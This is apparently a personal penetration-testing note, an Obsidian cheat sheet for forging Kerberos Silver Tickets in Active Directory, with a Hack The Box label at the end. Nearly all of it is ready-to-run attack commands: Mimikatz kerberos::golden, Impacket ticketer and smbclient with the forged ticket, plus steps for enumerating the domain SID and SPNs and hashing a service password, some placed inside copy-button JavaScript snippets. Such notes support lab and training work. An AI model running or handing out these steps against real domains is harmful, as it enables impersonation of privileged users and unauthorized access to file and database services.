**Purpose:** Forge a Kerberos service ticket (TGS) for a particular service.

**When to use:** You have the secret of the service account and the information needed to construct a ticket.

### **Required information**

- Domain name
- Domain SID
- Service account NTLM hash or suitable encryption key
- Target hostname
- Service SPN
- Username to place in the ticket

### **Windows — Mimikatz**

Example: forging a CIFS ticket for `FILE01`.

```
kerberos::golden /domain:domain.local /sid:<DOMAIN_SID> /target:FILE01.domain.local /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /user:Administrator /ptt
```

---

### **Step 1 : Get domain SID**

(Windows) User shell  : Get domain SID
```dataviewjs
const command = "get-addomain | Select-Object DomainSID";

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 1000);
});
```

Or from KALI
```dataviewjs
const command = "impacket-lookupsid domain.local/user:Password123!@<DC_IP>";

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 1000);
});
```

Or use the domain SID shown in BloodHound/domain enumeration.

---
### **Step 2 : Get SPN of svc account**

Get the**Service Principal Name (SPN)** of the SQL Server account
```dataviewjs
const command = 'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName';

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 1000);
});
```

---
### **Step 3 : Convert plaintext to NTLM**

Replace the {Service1} with password
```dataviewjs
const command = `python3 -c 'from impacket.ntlm import compute_nthash; print(compute_nthash("Service1").hex())'`;

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(command);
        button.textContent = "Copied!";
        setTimeout(() => button.textContent = command, 1000);
    } catch {
        button.textContent = "Copy failed";
    }
});
```

---
### **Step 4 : Use ticketer**

Kali — Impacket
```
impacket-ticketer \
-nthash <SERVICE_ACCOUNT_HASH> \
-domain-sid <DOMAIN_SID> \
-domain domain.local \
-spn cifs/FILE01.domain.local \
Administrator
```

Then:

```
export KRB5CCNAME=Administrator.ccache

impacket-smbclient -k -no-pass \
domain.local/Administrator@FILE01.domain.local
```

**Remember:**

- Silver Tickets are service-specific.
- A CIFS ticket is not automatically a ticket for HTTP, MSSQL or another service.
- Forging a ticket does not automatically grant local administrator or domain administrator privileges.
- The service must accept the forged ticket, and the identity must have the required permissions.

---

## **How to obtain the domain SID**

Useful for Silver and Golden Ticket construction.

### **Windows**

```
whoami /user
```

For the domain SID:

```
Get-ADDomain | Select-Object DomainSID
```



---

# HTB Cheatsheet

```
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid S-1-5-21-... -domain domain.htb -spn cifs/target.domain.htb administrator
```
